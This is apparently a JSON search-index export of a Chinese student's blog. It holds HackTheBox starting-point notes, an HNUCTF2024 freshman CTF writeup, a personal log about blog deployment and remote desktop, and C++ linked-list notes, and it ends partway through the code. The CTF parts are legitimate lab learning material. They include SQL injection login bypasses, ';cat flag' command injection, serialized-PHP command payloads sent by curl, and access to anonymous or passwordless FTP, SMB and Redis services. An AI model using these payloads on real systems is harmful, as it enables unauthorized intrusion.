Moyuin.vpn #记住得在文件目录里面打开，否则就是报错\n```\n\n### telnet\n\n**基础流程**：\n```bash\nping {target_ip} # 看看ping是否通，确认一下网络\n\nsudo nmap -sV -p {target_ip} # 找开的端口，确认一下我们的方案\n\ntelnet {target_ip} #直接连接，用root登陆\n\nls\nflag.txt  snap\n\ncat flag.txt\nb40abdfe23665f766f9c61ecba8a4c19\n```\n提交第一个 flag！telnet弱凭证！\n\n### ftp (File Transfer Protocol)\n```bash\nping {target_ip}\n\nsudo nmap -sV {target_ip}\n# 开21端口，用ftp连接\n\nftp -a {target_ip} #使用anonymous匿名登陆\n\nls | dir\n\nget flag.txt | mget flag.txt #后者下载多个文件，可以用lcd先设置好目录\n\nctrl+z #退出\n\ncat flag.txt\n```\n\n### SMB (Server Message Book)\n`sudo nmap -sV {target_ip}` 扫到端口。\n![](/images/Hackthebox/20250317000824135.png)\nSMB 在445/tcp运行，服务名为 microsoft-ds。\n使用 `smbclient -L {target_ip}` 访问SMP服务，获取所有的 Dancing List，但登陆后提示需要账户，随便输入后得到可以登陆的账户。\n\n![](/images/Hackthebox/20250317001452215.png)\n有4个用户，一直访问，直到获取权限。\n使用  `smbclient \\\\\\\\{target_ip}\\\\{用户名}` ，用于登陆，可是密码怎么办呢？使用空密码，一个一个账户试一试。\n用户名为WorkShares时，成功。\n![](/images/Hackthebox/20250317002508240.png)\n\n用help看看指令。发现基本和linux指令相同。\n![](/images/Hackthebox/20250317002646839.png)\n用cd进入各种库，看看flag藏在哪里。用 `get {文件名}` 得到文件。\n看完库了就 `cd .. ` 退出。\n![](/images/Hackthebox/20250317002934559.png)\n找到flag，get后exit。\n最后 `cat flag.txt` 得到答案。\n![](/images/Hackthebox/20250317003131774.png)\n\n### TCP(Redis)\n先扫端口，自己的虚拟机不知道为什么nmap扫不出6379这个端口，只好一个一个试了\n![](/images/Hackthebox/20250318225134933.png)\nRedis是一个内存数据库，详见[Redis维基百科](https://en.wikipedia.org/wiki/Redis)。\n使用 `redis-cli` 进入客户端基本操作。[可看菜鸟教程。](https://www.runoob.com/redis/redis-commands.html)\n用 -h 指定主机名，-p 指定端口， -a 指定密码。\n```bash\nredis-cli -h {target_ip} -p 6379 -a \"\"\n```\n连接远程redis服务器，开始操作。\n使用\n```bash\n{target_ip:6379}> INFO\n```\n找到服务器的消息。\n![](/images/Hackthebox/20250318231434680.png)\n在看keyspace的时候，可以看到连接的是哪一个数据库：\n![](/images/Hackthebox/20250318232344057.png)\n这里显示：这个服务器上只有一个数据库db0，db0有4个key，并且没有过期时间，每个数据库的数据是隔离的，一般用一个数据库的key存不同数据，所以我们先\n```bash\nkeys * #查看这个数据库所有的keys的名称，相当于ls了\n```\nps:如果有不同数据库，我们需要先\n```bash\nselect [index]\n```\n用于选择不同的数据库。\n![](/images/Hackthebox/20250318232918261.png)\n找到了flag，我们直接\n```bash\nget flag\n```\n![](/images/Hackthebox/20250318232955821.png)\n得到flag。\n\n## 免费HTB关卡结束,之后玩一玩别的。","tags":["CTF"],"categories":["CTF学习"]},{"title":"HNUCTF2024新生杯writeup","url":"/2025/03/05/xue-xi/ctf/hnuctf2024-xin-sheng-bei-writeup/","content":"# HNUCTF2024新生杯writeup\n\n**HNUCTF**新生杯——来自不睡觉的新生**MOMOsleeping**的wirteup\n这是一篇留档，为HNU2024年12月的一场新生杯writeup。\n也是我的第一场CTF。\n\n## 基本信息\n\n>**平台id：Moyuin**\n>**排名：第8名**\n\n## **解题情况**\n\n![](/images/HNUCTF2024新生杯writeup/解题情况.png)\n\n### Misc\n#### 1.Misc **签到**\n\n![](/images/HNUCTF2024新生杯writeup/misc1.png)\n复制粘贴即可。\n>**HNUCTF{Welcome_to_HNUCTF2024!}**\n\n#### 2.Misc **网络鲨鱼**\n上网搜索后发现是一个网络嗅探包，使用**Wireshark**打开文件，在一堆files not found中发现这个http流量get的有点特别。\n![](/images/HNUCTF2024新生杯writeup/misc2.png)\n猜测是base64加密，解码后得到。\n>**HNUCTF{w1r3sh4rk_4n4lys1s}**  \n\n#### 3.Misc **bob_traffic**\n同样是网络嗅探包。\n利用wireshark直接去分析tcp和http的get，发现有一个特殊流量（唯一的，显示f！ag，打开看看发现）\n![](/images/HNUCTF2024新生杯writeup/misc3.png)\n得到flag。\n与上一题解题思路重复了，也许上一题的各大http流量里面藏有所玄机？\n>**HNUCTF{pcapng_Zcpuatre_traffic}**\n\n#### 4.Misc **新佛经**\n\n![](/images/HNUCTF2024新生杯writeup/misc4.png)\n打开txt是一个hex编码，使用cyberchef解密得到\n```\nTFJZR1hKe2E2blIzaWdfcTBWM19JcmcwZ01yOX0=\n```\n\n拖过去base64解密，得到\n\n```\nLRYGXJ{a6nR3ig_q0V3_Irg0gMr9}\n```\n\n什么玩意儿？\n迷茫中看到题目说：\n\n>听闻凯撒贝斯。知晓16与string的轮回。\n\n贝斯是指base64，那么凯撒就是....\n凯撒密码？尝试凯撒密码一步一步解决。\n遍历4个加密位移后得到想要的结果。\n>**HNUCTF{w6jN3ec_m0R3_Enc0cIn9}**\n\n#### 5.Misc **Tetris**\n经典本地游戏CE修改器刷分咯。\n用ce修改这个游戏，跟着网上教程来。\n先得几分然后next scan最终得到这两个address。\n![](/images/HNUCTF2024新生杯writeup/misc5_1.png)\nChange一下变成10000，得到题目要求“10000分得到flag”。\n把value改到10000以上的数，然后让乱玩让gameover，之后弹出来:\n![](/images/HNUCTF2024新生杯writeup/misc5_2.png)\n得到flag。\n>`HNUCTF{#31c0m3_t0_HN#CtF_2024_eX1JT0O1}`\n*这里使用非代码块会出渲染问题....{和#的组合太恐怖*\n\n\n#### 6.Misc **git_leak**\n打开下载的文件，看见flag.txt打开:\n![](/images/HNUCTF2024新生杯writeup/misc6-1.png)\n那我就下一个Typora吧。学长有心了，给新生这样的小建议。\n![](/images/HNUCTF2024新生杯writeup/misc6-2.png)\n说里有个flag，开找“这里”，题目也说了是“git leak”。\n刚好，打开.git翻找，发现有一个文件叫flag，说明git里面有有关flags的记录！\n打开得到:\n![](/images/HNUCTF2024新生杯writeup/misc6-3.png)\n刚好vscode里面有一个git插件，就导入进去看看记录吧。\n![](/images/HNUCTF2024新生杯writeup/misc6-4.png)Flag在git里面leak咯。\n> **HNUCTF{y0u_h4ve_f1nd_th3_g1t_l34k}**\n\n### Crypto\n#### 1.Cypto **Buddha**\n**佛曰解密为base64**\n![](/images/HNUCTF2024新生杯writeup/crypto1-1.png)\nBase64解密即可\n![](/images/HNUCTF2024新生杯writeup/crypto1-2.png)\n>**HNUCTF{buddha_2c5f12b7-a95f-4c22-9372-1e320b297f49}**\n\n#### 2.Crypto **ebg13**\n**Base64**解密\n![](/images/HNUCTF2024新生杯writeup/crypto2-1.png)\n加凯撒密码\n![](/images/HNUCTF2024新生杯writeup/crypto2-2.png)\n\n>**HNUCTF{rot_is_fun_e8057890-1e42-4c61-9e57-4ad8c218e4c3}**\n\n#### 3.Crypto **ezrsa**\n让ai写一个解密rsa的python ,再不断装库之后得到。\n![](/images/HNUCTF2024新生杯writeup/crypto3-1.png)\n\n>**HNUCTF{rsa_is_fun_8e4b49fd-070c-473f-a510-ff891b95f56b}**\n\n### WEB  \n#### 1.Web **ez_sqli**\n经典sql注入。\n经典的用户名：admin' OR '1'='1\n密码：输入啥都行\n![](/images/HNUCTF2024新生杯writeup/web1.png)\n\n>**HNUCTF{SQL_iNJECTor_4059a701-61a6-4f11-96bd-e6b01e3a3186}**\n\n\n#### 2.Web **ez_cmdi**\n现学curl，理解一下get和post。\n看ip，ip后的输入可以当作命令，直接cat flag。\n那我们给ip后发送command即可。\n![](/images/HNUCTF2024新生杯writeup/web2.png)\n>**HNUCTF{ping_command_091ae904-c702-4b02-9bf6-9d377aa382c6}**\n\n#### 3.Web **md5:**\n经典md5= =比较。\n根据if条件可以判断要找两个不同但md5相同的字符串\n找个md5碰撞对相同的密码和用户名就ok了，这个得去网上找一下。\n![](/images/HNUCTF2024新生杯writeup/web3.png)\n随便挑一个curl一下输入post传参即可。\n输入：\n```\ncurl -X POST -d \"password=QNKCDZO\" \"http://129.204.78.34:20703?name=240610708\"\n```\n得到Flag:\n>**HNUCTF{easy_md5_2b34686e-50b2-45e8-9757-e28a94fece1f}**\n\n#### 4.Web **md5_again:**\n以为是Name从get变成post，改一下输入curl就行\n发现不对！\n转头一看发现是严格相等。为===\n![](/images/HNUCTF2024新生杯writeup/web4.png)\n由于题目还限定了强制转化字符串比较，因此不能使用数组来绕过，我们需要构造一对md5相同而不同字符的字符串。我们只能使用md5碰撞来实现。\n去网上找一下符合要求的，复制粘贴形成post要传的参数。\ncurl post记得urlencode，把特殊字符传出去。\n![](/images/HNUCTF2024新生杯writeup/web4-2.png)\n```\ncurl -X POST \"http://x.x.x.x:xxxx\" \\\n     -H \"Content-Type: application/x-www-form-urlencoded\" \\\n     -d \"name=M%9C9h%FF%E0%E3%5C%20%9...%93%D8&password=M%9C9h%FF%E0%E3%5C%20%9...%93%D8\"\n```\npowershell传入。\n![](/images/HNUCTF2024新生杯writeup/web4-3.png)\n得到flag\n>**HNUCTF{md5_again_bcf8de06-3aa5-4c09-9120-4bfeccf0b5a1}**\n\n#### 5.Web **ez_serialize**\n看得懂那个网站的php：\n传入post的参数为base64可以转化为command指令，那我们直接先ls看看有没有flag，然后cat一下就出来了。\n先将命令转化为base64，然后curl传进去。\n![](/images/HNUCTF2024新生杯writeup/web5-1.png)\n获取ls：\n```\ncurl -X POST -d\n\"data=Tzo10iJteWNtZCI6MTp7cz0z0iJjbWQ103M6NDoibHMgLyI7fQ==\"\nhttp://129.204.78.34:20738/\n```\ncat flag：\n```\ncurl -X POST -d\n\"data=Tzo10iJtewNtZCI6MTp7cz0z0iJjbwQi03M60ToiY2F0Ic9mbGFnIjt9\" http://129.204.78.34:20738/\n```\n>**HNUCTF{easy_serialize_af79f24b-7638-4e49-b60d-08ac1431d690}**\n\n### PWN\n#### 1.Pwn **command injection**\nnc连接到ip，这不用说。\n获取command权限后，但是发现ls和cat没反应。\n但是看了看规则后，显示==;==后的命令会进行。\n诶，那是不是说明 ；前面的指令无法执行，后面的指令可以进行？然后就尝试 ;cat flag了一下，结果就出来了\n![](/images/HNUCTF2024新生杯writeup/PWN1.png)\n> **HNUCTF{u_have_completed_the_command_injection_28918ec949db}**\n\n### Reverse\n#### 1.Reverse: **ez_reverse1**\n\n签到题就要有签到题的样子，在网上看看reverse签到题一般什么样，然后学习。\n**先下载神器ida pro,再跟着做**\n- 将文件导入到IDA里\n- 按F5进行反编译\n- 观察反编译后的C语言源码，找到flag\n![](/images/HNUCTF2024新生杯writeup/reverse1-1.png)\n![](/images/HNUCTF2024新生杯writeup/reverse1-2.png)\n>  **HNUCTF{W3lcome_t0_HNUCTF}**\n\n### OSINT\n#### 1.Osint **here is**\n照片里可以看到：\n**虎踞龙盘在此间；灵秀聚钟人莫识**\n在bing搜索一下发现一篇介绍韶山滴水洞引用这句诗的新闻。*（顺便感慨一下bing的强悍爬虫....已经把这个博客的文章给爬取了）*\n![](/images/HNUCTF2024新生杯writeup/osint1-1.png)\n结合这里的山环境，可以合理猜测一下这个地点就是滴水洞景区，搜索一下它的票价。\n![](/images/HNUCTF2024新生杯writeup/osint1-2.png)\n根据flag所给规则，写入正确：\n>**HNUCTF{dishuidong_O3!nT_40.00}**\n\n#### 2.Osint **where_are_i**\n关键词 **云巴，磁悬浮，空旷，十字路口**。打开百度地图搜索就看得见一个**云巴旅游磁悬浮线**，观察附近街景直接确定。\n并且周围还有相同的建筑物，更加笃定了。\n![](/images/HNUCTF2024新生杯writeup/osint2-1.png)\n找到街景最近的十字路口。\n![](/images/HNUCTF2024新生杯writeup/osint2-2.png)\n![](/images/HNUCTF2024新生杯writeup/osint2-3.png)\n得到flag。\n>**HNUCTF{112.924_28.096_Os!nT}**\n\n#### 3.Osint **where_are_i_again!**\n通过12306查询D3009这辆车 ，对比时间，粗略判断这一站是**南京南**。\n![](/images/HNUCTF2024新生杯writeup/osint3-1.png)\n然后从南京南找到75为末尾号，终点站为合肥南，始发站为XX南的列车，恰好就这一个：\n![](/images/HNUCTF2024新生杯writeup/osint3-2.png)\n![](/images/HNUCTF2024新生杯writeup/osint3-3.png)\n注意flag是始发站的车次号就ok，G7675始发站为G7674，得到flag。\n>**HNUCTF{0siN7_G7674_nanjingnan}**\n\n#### 4.Osint **see_see_need**\n去bing搜搜信安协会会长[L1uYun](https://github.com/L1uYun/l1uyun_blog) 找到了他的github！\n然后在他的blog里看他最近的submit的文件 发现了\n![](/images/HNUCTF2024新生杯writeup/osint4-1.png)\n交上去发现不对，很怪，结合聊天记录说有干扰项，另辟思路看看其他大佬的。\n发现了一个健身学长[yulv706](https://github.com/yulv706/blog/blob/main/src/site/notes/blog/%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7/Hydra_%E5%AD%97%E5%85%B8%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3.md)的github仓库！\n![](/images/HNUCTF2024新生杯writeup/osint4-2.png)\n其实还有一个派大星学长的，但是派大星学长直接说是HNUCTF{fake_flag}，故直接提交可用的flag。\n因为健身佬的blog好久没更新了，所以我只要看最新的更新一直点一直点，然后看到HNUCTF复制粘贴就好了。或者直接去他的博客检索HNUCTF，也可以得到含有这个flag的博客文章。*顺便学到了一些ctf知识*\n提交成功。\n**大家平时也要注意自己的个人信息能不能直接被搜索引擎搜到哦...😑**\n> **HNUCTF{OSINT_leads_to_flag}**\n\n## **总结**\n作为新生打这场ctf还是很开心的！这一次新生杯严格来说算是自己的第一次网安的比赛，感觉和acm很不一样，也更好玩一些，像一系列趣味游戏！\n![](/images/HNUCTF2024新生杯writeup/summary.png)\n前面的大佬还是超级多！！有ak的！太强了，和前一名的这位新生大佬差快800分了，但是作为新生，第一次尝试这场比赛我已经很知足，边打边学新知识，实践出真知！\n虽然reverse和pwn没写出来几个哈哈哈，但是web和misc做了很多，还是很感兴趣的，以后要选比赛方向的话，这两个很有趣，可能会选。\n但是pwn的操作很像 《**Hacknet**》的玩法，这个更符合我对hacker的印象了，超级酷，reverse有点难难的，涉及到编译基础，也激励着我在之后的学习中多多了解。\n![](/images/HNUCTF2024新生杯writeup/blanket.png)\n\n**收获很多，期待以后的前行路。**\n\n\n\n\n\n\n\n","tags":["记录","学习","CTF","writeup"],"categories":["CTF学习"]},{"title":"记录与计划","url":"/2025/03/03/sheng-huo/ji-lu/xiao-ji-lu/","content":"# 记录与计划\n记录一些最近的小成就。🥳\n## 购买域名，实现国内浏览✅\n之前在github pages默认的.github.io实现博客部署，在国内访问也太困难了，本来一直很苦恼于这个问题。\n但最近，于2025.3.1在namesilo购买了moyuin.top域名，并交给cloudflare托管，将github pages的网站转发到这个域名里，实现在国内也可以顺利浏览我的博客。\n**可以更方便的给同学发笔记了**。😎\n\n---\n\n## 实现自动部署✅\n\n### 初步解决自动部署！\n之前苦恼于hexo三部曲输入三个指令也太麻烦。并且在博客写的文章，无论是手机写的还是平板写的，都得通过局域网传输到电脑上，然后电脑整理分类后再进行hexo三部曲。\n**现在记录笔记是Obsidian+Git+Sync方案**，Obsidian把仓库插件整合到文件夹里也太好用了，我的git插件只要所有设备sync同步一下，文件夹里的东西直接互通，运行无障碍。\n然后只要再Obsidian里面commit和push一下就可以直接自动放到代码仓库里面，交由远程的Github action进行hexo三部曲，极大地改善了写博文的舒适度。\n并且放在vscode里面，只要点点点就可以实现git提交和同步，在电脑上整理代码笔记也更加方便了。\n实现了懒人同步！🤪\n了吗?😢\n\n---\n### 同步问题\n目前还有一个问题，为了节约手机和平板的内存和避免其他配置类文件与它进行冲突，所以我的共享文件夹都只是共享了含有博客文章管理的source文件夹。\n😭导致我的git文件夹没有同步进来。\n*目前还得写好然后用一个电脑提交...*\n*思考解决方法中。*\n\n>好像最佳方法是使用submodule去进行管理，得研究一下。\n>当然也有另一种方法，是直接Obsidian库迁移为博客源代码库，但是这样过于麻烦，并且我那配置仅仅是6+128g的小平板在说求放过，手机也在说不要增添一些莫名其妙的垃圾文件污染了。😔\n\n---\n### 问题解决！\n通过把source通过submodule连接博客仓库，实现了在source里面的git仓库与博客仓库的联动！顺便加入了新的github action，当检测到source文件夹变动并且推送到source仓库的时候，我的博客仓库自动commit和push，然后引发自动部署！\n😋已经实现懒人部署！\n\n---\n## 远程桌面！⭐\n**这绝对是目前最伟大的成就！**\n### 局域网初步\n寒假买了平板，听说了moonlight+sunshine的局域网远程桌面方案，想着最大化利用平板，于是寒假开始了初步操作。\n局域网连接很快，我的平板很顺利的连上了电脑！我将沉重的游戏本电脑丢到一边，抱着键盘鼠标和平板在床上玩了起来…**只要连接同一个网络，我的平板就能连接电脑高画质流畅运行各大游戏**，黑神话，大表哥，看门狗，应有尽有…\n但我选择了每天在床上or烤火炉前玩解锁帧率的高帧率原神🤪…玩原神玩的。\n**但局域网还是有一个缺陷**，只要平板和电脑不连接同一网络，我的平板就识别不到电脑存在。\n下一步考虑远程连接。\n\n---\n\n### 远程桌面初步\n开学后背着电脑回了学校，在一个寒假轻量级平板的洗礼后，开始觉得我的游戏本很沉重了。（*明明买的时候特意买的最轻的游戏本*），于是开始钻研怎么在不同网络下实现远程桌面。\n\n---\n#### 微软远程桌面RDP?❌\nRDP是微软用windows的远程桌面，确实好用，但是开端口转发，没有路由器中转，也没有自己的服务器支持，只能考虑通过校园网的局域网来实现宿舍与教室的连接。\n况且RDP在局域网内的表现也表现的不稳定。而且在Skywt的学长的[一篇博客](https://skywt.cn/blog/wireshark-sniff#%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84-ap-%E9%9A%94%E7%A6%BB)里了解到HNU的校园网不同于普通局域网，**校园网是AP隔离的**，不同设备连接校园网是无法相互访问的，即便电脑和平板都连接的是宿舍区域的校园网，也无法通过moonlight找到电脑设备。\n因此只能考虑其他软件提供的远程连接服务，或者是利用校园网进行局域网连接，内网穿透。\n\n---\n#### todesk等网络远程连接?❓\n**流畅情况依赖于网速。**\n校园网网速感人，望周知。且HNU的校园网面向全体师生，也不了解学校的网络是如何分配带宽的，对于远程桌面的实现，如果采用服务器中转，在校园网的给力下，甚至**无法做到稳定60帧**。\n用Todesk等软件的确可以实现远程连接，不过设备兼容性并没有moonlight好（比如我键盘alt+tab在todesk里是给自己平板切换界面，非常反人类），不过也能正常使用它的锁屏和开机功能，可以做应急使用，故作保留。\n\n---\n#### 申请公网ipv6连接?❌\n呃，连接校园网，没有公网ipv6的可能性。且没有办理校园宽带（听说那个也浪费钱，速度慢，也不稳定），在宿舍只有随身wifi插着电话卡当路由器，更没有实现公网转发的可能性。\n\n---\n#### 校园网+tailscale内网穿透，打破AP隔离，校园区域P2P直连✅\n那在校园区域内，只有一种做法了，也就是转向校园网...既然校园网内不允许局域网设备互相访问，那就使用内网穿透进行直连吧，经检验，这个方法最流畅（可以做到2k120帧），并且在moonlight的给力设备兼容下，在平板键盘的操作与电脑键盘无异。\n采用免费的tailscale做内网穿透，主要是给ip直接所有设备登陆同一账号就行，非常便利。\n在设备同连接校园网的情况下，tailscale可以做到内网穿透，并且也支持sync的同步数据，非常贴合我的需求，暂时不想过多折腾它了，我已经非常满意它的表现。\n\n---\n\n#### 但仍然有缺点....\n基于tailscale的内网穿透，在设备连接不同网络下，tailscale就会走relay中转，毕竟是国外软件，中转服务器最近的是来自Tokyo的服务器...流畅度不言而喻。\n这样的话，我只要一离开校园区域，也就是有校园网的地方，我的远程桌面几乎等于失效。\n因此之后想要解决这个问题，目前来看必须有一个自己能用的国内服务器，拉过来做中转才可以...目前限制极多，且自己还是新手，对服务器的维护一无所知，万一哪一天服务器被攻击，现在的我是束手无策，因此只能潜心凝力...\n这个方案的完美实现道阻且长。不过实现了的话，我也可以考虑换一台台式机放在宿舍里了...\n\n## 下一步想做的？\n### 拿到一个服务器✅\n#### 折腾一下科学上网✅\n我也很想有个属于自己的流畅上网工具。\n虽然说现在用的这个很稳定，而且也不用我掏钱维护（这时候还得看爹），但是我还是想尝试独立一下的，总得试试，不能总靠爹。万一哪天有了问题，还是自己维护的好。\n\n**有了有了**，github学生认证拿到一台digitalocean的vps，做wireguard也够折腾了🥳，而且时间足够我撑到成年购买一台自己的。\n问题是不太稳定，还没搞懂这个怎么搞，先放着。\n\n---\n#### 迁移博客\n将博客放在github pages里面部署确实方便，但是这样好像也会限制我的一些...自由性？给自己的博客网站备案什么的 。*（虽然我11月才成年....)*\n\n---\n#### 找一个能用的服务器做frp转发，完善远程桌面。\n\n---\n ###  **了解一下RSS订阅** ✅\n我看很多大佬上面都挂着一个RSS订阅，是什么东西，我能搞吗？\n好像挺高级的，可是现在我连友链都没有，我需要去好好折腾一下。\n\n成功搞了一个rss订阅…但应该只有我自己会订阅我自己吧，毕竟我的文章没有什么很含价值，引人思考的内容🤕\n\n---\n### 拉到友链上的朋友\n我写博客大多数还是给自己留个记录，在网站上美观地看我的记录，换台设备只要浏览我的博客网站就可以随时随地的去获取信息，很方便。\n但是我也希望有一个能挂在友链上的朋友...不是带有功利性的，只是想在这个小圈子里，多一个可以分享思考和感悟的人吧。\n\n**未完待续...**","tags":["记录","计划","生活"],"categories":["杂谈"]},{"title":"数据结构-线性表笔记","url":"/2025/02/26/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-xian-xing-biao-bi-ji/","content":"# 数据结构-线性表笔记\n\n普通的数组与出入栈在STL很好用，但是涉及链表进行指针操作较为薄弱，因此记录一下链表的操作。\n\n---\n\n## 链表的创建\n\n### 单向链表的创建\n\n```cpp\nstruct Node // 创建单向链表\n{\n    int data; //数据\n    Node *next; //指向下一元素\n};\n```\n\n**单向链表的操作的时间复杂度，插入和删除的时间复杂度为O(n)(n为链表长度)，查找的时间复杂度为O(n)(n为链表长度)**\n\n---\n\n### 双向链表的创建\n\n```cpp\nstruct Node // 创建双向链表\n{\n    int data;\n    Node *next; // 指向下一元素\n    Node *prev;// 指向上一元素\n};\n```\n\n**双向链表的操作的时间复杂度与单向链表类似，只是在插入和删除时需要更改指针的指向，所以时间复杂度为O(n)(n为链表长度)**\n\n---\n\n### 块状链表,循环链表的创建\n\n都与基本链表的创建有关。\n\n- 循环链表将末尾元素的next指针指向首元素，构建循环。\n\n  ```cpp\n  // 循环链表的构建\n  struct CircularNode {\n      int data;\n      CircularNode* next;\n  };\n  // 在插入数据时候，末尾进行\n  newNode->next = head;\n  ```\n\n  \n\n- 块状链表是由多个链表拼接，存储的数据（data）是不同链表的指针。\n\n  ```cpp\n  // 块状链表的构建\n  struct Block {\n      vector<Node*> nodes;\n      Block* next;\n      Block* prev;\n  };\n  ```\n\n  **双向链表与指针结合，构建连接不同双向链表的块状链表，存储数据的同时，还存储了指向前后块的指针，这样就可以在O(sqrt(n))的时间内找到任意一个元素。使用块状链表，可以减少查找的时间复杂度，为O(sqrt(n))。**\n\n---\n\n## 链表的基本操作\n\n### 链表的插入\n\n**（这里以单向链表为例)**\n\n```cpp\nvoid insert(Node *&head, int value)\n{\n    Node *newNode = new Node(); // 创建一个新的结点\n    newNode->data = value;    // 赋值\n    newNode->next = nullptr;  // 初始化next指针\n    if (head == nullptr)\n    {\n        head = newNode;\n    } // 如果链表为空，直接插入\n    else\n    {\n        Node *temp = head;\n        while (temp->next != nullptr) // 遍历链表，找到最后一个结点\n        {\n            temp = temp->next;\n        }\n        temp->next = newNode;\n    }\n}\n```\n\n逻辑很简单。\n\n- 先创一个新结点（因为是指针形式的，所以用new形式建立）。\n\n- 然后给data赋值。\n\n- 再看看它要插入的地方是不是head，是head就简单，直接把它的next设立为head。\n\n  >  *如果是双向链表就再注意一下head的prev改成新结点*\n\n- 不是head的话，直接while找到要插入的位置（这里自己设定while的循环条件），然后改要插入位置的前者next为它的next，然后把前者的next改为它。\n\n  > 如果是双向链表的话注意一下前者的next的prev也要改成它，它的prev改成前者。\n   ```cpp\n     while (temp->id != k)//k为要插入的位置，这里做个示范\n           {\n               temp = temp->next;\n           }\n           if (temp->next != nullptr)\n           {\n               temp->next->prev = newNode;\n           }\n           newNode->next = temp->next;\n          temp->next = newNode;\n   ```\n\n- 然后改完了就完事，插入一个结点嘛。\n\n  **不过这个方法的时间复杂度为O(n)，在进行大数据的遍历的时候和有可能耗时巨大，之后的学习生活中会学习二叉树，哈希表等方法来优化**。\n\n  ---\n\n### 链表的结点删除\n\n```cpp\nvoid deleteData(Node *&head, int value)\n{\n    Node *temp = head;\n    Node *prev = nullptr;\n    if (temp != nullptr && temp->data == value)\n    {\n        head = temp->next;\n        delete temp;\n        return;\n    } // 删除头结点\n    while (temp != nullptr && temp->data != value)\n    {\n        prev = temp;\n        temp = temp->next;\n    } // 找到要删除的结点，遍历\n    if (temp == nullptr)\n    {\n        return;\n    } // 没找到要删除的结点，没有值对应的链表节点\n    prev->next = temp->next;\n    delete temp;\n}\n```\n\n**首先最重要的，head的函数引用为&head！因为head很有可能也是删除结点！**\n\n**否则退出函数后head并没有进行改变操作，将会造成RE即运行时错误。**\n\n- 先建立一个temp结点，给它先变成head结点，这样可以解决head因为是引用形式的不能轻易去改变值的问题，利于后续while循环来查找值。\n\n- 在写之前要考虑三种情况\n  1. 链表是空的，那删什么？\n  2. 链表找不到我要删掉的值，那删什么？\n  3. 链表要删掉头，那遍历什么？\n\n- 然后用if来判断一下情况。\n\n  - 先考虑如果是链表是空的，那我们就可以什么都不做了。\n\n    ``` if (temp == nullptr) return;```\n\n  - 再想想如果删掉头，那我们就不用遍历了。\n\n    ``` cpp\n      if (temp != nullptr && temp->data == value)\n        {\n            head = temp->next;\n            delete temp;\n            return;\n        }\n    ```\n\n  - 然后就可以开始愉快地遍历了。\n\n    ```cpp\n    while (temp != nullptr && temp->data != value)\n        {\n            prev = temp;\n            temp = temp->next;\n        } // 找到要删除的结点，遍历\n    ```\n\n  - 找到的话，我们需要把这个结点的前者连接到下一结点。如果是双向链表很方便，直接```temp->prev->next=temp->next```了，不需要prev的参与。\n\n    但这里是单向链表，我们还是要有一个临时指针指向temp的前者的，也塞进去循环里就可以了，然后进行一样的操作。\n\n    ```cpp\n    prev->next = temp->next;\n    ```\n\n  - 没找到的话，那我们这个while的操作一直运行，直到temp变成了链表尾部的next，即就是空指针NULL。\n\n    **那prev指向的结点就是原链表尾部，temp为nullptr的话，那temp就没有next的值。这样的话进行最后一步就会报错，注意这里的内存管理。**\n\n    这里选择用语句直接包揽1和2情况。\n\n    ```cpp\n     if (temp == nullptr)\n        {\n            return;\n        } \n    ```\n\n  - 这里体现删除的操作的时间复杂度为O(n)。\n  \n  ---\n\n### 链表的显示输出\n\n很简单，从头开始while循环输出值即可。\n\n```cpp\nvoid printList(Node *head)\n{\n    Node *temp = head;\n    while (temp != nullptr)\n    {\n        cout << temp->data << \" \";\n        temp = temp->next;\n    }\n    cout << endl;\n}\n```\n\n也是从头遍历到尾部，时间复杂度为O(n)。\n\n## 链表的操作实战\n\n### 实战题目\n\n题目源于洛谷数据结构题单【数据结构1-1】线性表p1160[队列安排](https://www.luogu.com.cn/problem/P1160)。\n\n---\n### **非AC代码**\n\n**采用基础的遍历来解决问题**，在数据较小的时候可以满足结果，而数据较大时候因为O(n^2)的时间复杂度而导致TLE，解决方法见注释。\n<details>\n  <summary>点击查看代码 </summary>\n```cpp\n#include <iostream>\nusing namespace std;\n//面对大数据来写直接插入排序，时间复杂度为O(n^2)。\n//插入排序与删除的优点是不需要额外的空间，缺点是查找时间复杂度较高。\n//优化的话可以考虑利用哈希表，查找时间复杂度为O(1)，空间复杂度为O(n)\n//另外一种方法是利用二叉搜索树，查找时间复杂度为O(nlogn)，空间复杂度为O(n)\nstruct node\n{\n    int id;\n    node *prev;\n    node *next;\n};\nvoid insert(node *&head, int k, int i, bool left);\nvoid deleteValue(node *&head, int id);\nvoid printList(node *head);\nint main()\n{\n    ios::sync_with_stdio(false);\n    cin.tie(0);\n    cout.tie(0);\n    int n, m;\n    cin >> n;\n    node *head = new node();\n    head->id = 1;\n    head->next = nullptr;\n    head->prev = nullptr;\n    // 重整顺序\n    for (int i = 1; i < n; i++)\n    {\n        int k, p;\n        cin >> k >> p;\n        bool left = (p == 0 ? true : false);\n        insert(head, k, i, left);\n        // printList(head);\n    }\n    cin >> m;\n    for (int i = 0; i < m; i++)\n    {\n        int id;\n        cin >> id;\n        deleteValue(head, id);\n        // printList(head);\n    }\n    printList(head);\n} // 链表手写数据结构版本\n\nvoid insert(node *&head, int k, int i, bool left)\n{\n    node *newNode = new node();\n    newNode->id = i + 1;\n    newNode->prev = nullptr;\n    newNode->next = nullptr;\n    node *temp = head;\n    if (!left)\n    {\n        while (temp->id != k)\n        {\n            temp = temp->next;\n        }\n        if (temp->next != nullptr)\n        {\n            temp->next->prev = newNode;\n        }\n        newNode->next = temp->next;\n        temp->next = newNode;\n        newNode->prev = temp;\n    }\n    else\n    {\n        while (temp->id != k)\n        {\n            temp = temp->next;\n        }\n        if (temp->prev == nullptr)\n        {\n            head = newNode;\n        }\n        else\n        {\n            temp->prev->next = newNode;\n        }\n        newNode->prev = temp->prev;\n        temp->prev = newNode;\n        newNode->next = temp;\n    }\n}\n\nvoid deleteValue(node *&head, int id)\n{\n    node *temp = head;\n    node *prior = nullptr;\n    if (temp != nullptr && temp->id == id)\n    {\n        head = temp->next;\n        head->prev = nullptr; // 这里可要可不要\n        delete temp;\n        return;\n    } // 删除头节点\n    while (temp != nullptr && temp->id != id)\n    {\n        prior = temp;\n        temp = temp->next;\n    }\n    if (temp == nullptr)\n    {\n        return;\n    }\n    prior->next = temp->next;\n    prior->prev = temp->prev;\n    if (temp->next != nullptr)\n        temp->next->prev = prior;\n    delete temp;\n}\n\nvoid printList(node *head)\n{\n    node *temp = head;\n    while (temp != nullptr)\n    {\n        cout << temp->id << \" \";\n        temp = 